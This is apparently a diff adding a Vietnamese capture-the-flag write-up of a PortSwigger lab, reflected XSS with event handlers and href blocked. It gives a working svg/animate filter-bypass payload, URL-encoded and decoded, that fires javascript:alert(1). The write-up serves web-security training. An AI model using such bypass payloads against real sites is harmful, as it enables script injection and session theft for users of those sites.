@@ -215,3 +215,34 @@ Deliver to victim => Lab solved!
 
 <img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a26a8b16-44d2-4218-8149-4e0310d1316c">
 
+***
+
+## 7. Lab: Reflected XSS with event handlers and href attributes blocked
+
+* Content:
+```
+This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..
+
+To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.
+
+Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
+
+<a href="">Click me</a>
+```
+* Exploit:
+
+Tương tự Lab trước, xác định các thẻ sau không bị filter block
+
+<img width="424" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e3af6cf1-a911-4ed1-8e32-7fde86a60c3c">
+
+Đầu bài yêu cầu ta phải click để trigger alert, ngoài ra không được dùng thuộc tính href => Sử dụng thẻ `svg`
+
+Sử dụng Payload như sau:
+`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`
+
+Decode cho dễ đọc như sau:
+`https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`
+
+Lab Solved!
+
+<img width="586" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/825cbc2b-542d-4fd6-a804-222163dbb2c4">
